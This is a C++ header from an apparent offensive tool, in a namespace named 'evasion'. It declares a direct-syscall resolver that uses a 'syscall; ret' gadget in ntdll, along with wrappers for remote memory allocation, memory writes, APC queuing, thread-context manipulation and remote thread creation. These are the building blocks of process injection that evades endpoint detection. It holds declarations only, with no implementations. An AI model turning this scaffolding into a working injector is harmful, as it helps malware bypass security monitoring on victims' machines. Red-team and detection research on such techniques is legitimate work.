#pragma once
#include <windows.h>
#include <map>
#include <string>
#include <vector>

namespace evasion {

struct SyscallStub {
    DWORD ssn;
    PVOID address;
};

class SyscallResolver {
public:
    static SyscallResolver& GetInstance();

    // Resolves a syscall by name (e.g., "NtAllocateVirtualMemory")
    DWORD GetServiceNumber(const std::string& functionName);

    // Gets the address of the 'syscall; ret' gadget in ntdll
    PVOID GetSyscallGadget();

private:
    SyscallResolver();
    void ResolveAll();

    std::map<std::string, DWORD> m_syscallMap;
    PVOID m_syscallGadget = nullptr;
};

// Syscall Wrappers
NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
NTSTATUS SysNtQueueApcThreadEx(HANDLE ThreadHandle, HANDLE UserApcReserveHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount);
NTSTATUS SysNtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
NTSTATUS SysNtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext);
NTSTATUS SysNtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext);
NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
NTSTATUS SysNtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
NTSTATUS SysNtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);

} // namespace evasion

// Helper for calling syscalls (requires assembly or gadget jump)
// Prototype with UINT_PTR to avoid pointer truncation warnings on x64
extern "C" NTSTATUS InternalDoSyscall(DWORD ssn,
    UINT_PTR a1, UINT_PTR a2, UINT_PTR a3, UINT_PTR a4,
    UINT_PTR a5, UINT_PTR a6, UINT_PTR a7, UINT_PTR a8,
    UINT_PTR a9, UINT_PTR a10, UINT_PTR a11);
